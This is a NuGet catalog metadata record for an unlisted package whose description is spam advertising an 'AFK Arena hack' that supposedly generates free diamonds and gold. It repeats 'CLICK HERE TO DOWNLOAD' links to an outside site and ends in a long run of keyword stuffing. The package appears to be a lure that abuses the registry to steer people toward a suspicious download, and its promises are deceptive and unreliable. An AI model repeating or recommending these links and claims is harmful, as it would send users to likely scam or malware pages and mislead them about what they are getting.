{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.28.23.58.17/_afk-arena-hack-working-2022-version-mtu.3.6.72.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "ce217130-5c68-4df0-b406-815ca297dc09",
  "catalog:commitTimeStamp": "2022-01-28T23:58:17.0371954Z",
  "created": "2022-01-26T16:31:24.65Z",
  "description": "# _AFK Arena hack Working 2022 Version mtu\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://11.bltadwin.ru/hack.php](http://11.bltadwin.ru/hack.php)\n\n\nThe best way to use cheats is through the generator. First, you will need to enter your current username in the required field. After that, pick the number of. AFK Arena hack cheats for free diamonds and golds - Tech News, How to Guides, Cheats and More.. Are you looking for a free AFK Arena Hack that will allow you to. Best AFK Arena Hacks That Work · Arcane Labyrinth Boss Reward Trick · Leveling up Heroes Effectively · Improve The Gears of Mercenaries · Get Extra Resources for.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://11.bltadwin.ru/hack.php](http://11.bltadwin.ru/hack.php)\n\n · This AFK arena hacked APK gives you latest cracked features that will allow you to play with unlocking many new heroes. With New unlocked factions, you can easily defeat your enemies and win numerous battles. Below are the main key features of this AFK Area Mod APK Unlimited Diamonds/5.  · Afk arena hack is here guys!! Afk arena hack unlimited gold diamonds gold generator no jailbreak or root (no human verification) today, we got the afk arena hack at your download really is an afk arena online hack, which could generate unlimited number of diamonds gold to your game download that said, she is still very good for pve, just not as . Yes, it is possible now  You can Generate AFK Arena Diamonds using AFK Arena Diamonds hack and Generator in just a few clicks. Some parts of the game are premium  you have to pay real money from your wallet or bank. But here you don’t need to pay any amount for free Diamonds so take advantage of it.\n\nafk arena hack tool, afk arena hack codes, afk arena hack no survey, afk arena hack apk android, afk arena hacked, afk arena hack no human verification, afk arena hacked account, afk arena hack download, afk arena hack ios, afk arena hack reddit, afk arena hack apk download, afk arena hack android, afk arena hack apk ios, afk arena hack apk 2021, afk arena hack mod apk download, hack afk arena 2020 android, hack afk arena 2021 android, afk hack, afk arena bluestacks hack, bản hack afk arena, afk heroes idle arena - peak battle hack, afk arena hack cheat engine, afk arena hacked client, cách hack afk arena 2020, cara hack afk arena, cách hack afk arena ios, afk arena hack discord, afk arena hack diamonds, afk arena hack download ios, afk arena diamonds hack no verification, afk arena damage hack, afk arena diamond hack reddit, afk arena exp hack, hack afk arena 2020 español, afk arena hack español, can you hack afk arena, afk arena how long can i afk, afk arena hack free, afk arena hacks for ios, afk arena free diamonds hack, hack for afk arena, hack afk arena fr, afk arena hack no verification, afk arena hack generator, afk arena hack game guardian, afk arena hack gg, afk arena gem hack, afk arena gems hack no human verification, tải game afk arena hack, hack game afk arena, hack game afk arena mới nhất, afk arena hero hack, afk heroes idle arena hack, afk arena hack iosgods, afk arena hack ipa, afk arena hack ios download, afk arena hack iphone, afk arena hack 2021 ios, hack afk arena 2020 ios, afk arena hack jailbreak, hack kc afk arena, afk arena hack mod, afk arena mobile hack, hack afk arena miễn phí, afk ninja arena hack, afk arena hack online, afk arena hack pc, hack para afk arena, hack para afk arena 2020, hack para afk arena 2021, can afk arena be hacked, afk arena root hack, real afk arena hack, r afk arena, afk arena hacks, afk arena hacks reddit, afk arena hacks ios, afk arena hacks apk, afk arena hacked server, afk arena speed hack, hacksmith afk arena, is afk arena hackable, how to hack afk arena, is afk arena safe, afk arena time hack, tải afk arena hack, afk arena hack version, afk arena vip hack, afk arena working hack, how to hack afk arena with lucky patcher, afk arena 1.44.05 hack, afk arena hack 2021, afk arena hacks 2020",
  "id": "_AFK-Arena-hack-Working-2022-Version-mtu",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-28T23:45:38.393Z",
  "listed": false,
  "packageHash": "3yHODqFSXmdOkYAWQ/iy0uTRWTsiLtha+Qq1b6Jv+9V64lH9gimuRDsCRN+4JxBeDizsy49SnwHcij6tEHrfoQ==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11744,
  "published": "1900-01-01T00:00:00Z",
  "requireLicenseAcceptance": false,
  "title": "_AFK-Arena-hack-Working-2022-Version-mtu",
  "verbatimVersion": "3.6.72",
  "version": "3.6.72",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.28.23.58.17/_afk-arena-hack-working-2022-version-mtu.3.6.72.json#qyttykdlyf.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1613,
      "fullName": "qyttykdlyf.nuspec",
      "length": 4474,
      "name": "qyttykdlyf.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.28.23.58.17/_afk-arena-hack-working-2022-version-mtu.3.6.72.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9471,
      "fullName": ".signature.p7s",
      "length": 9471,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}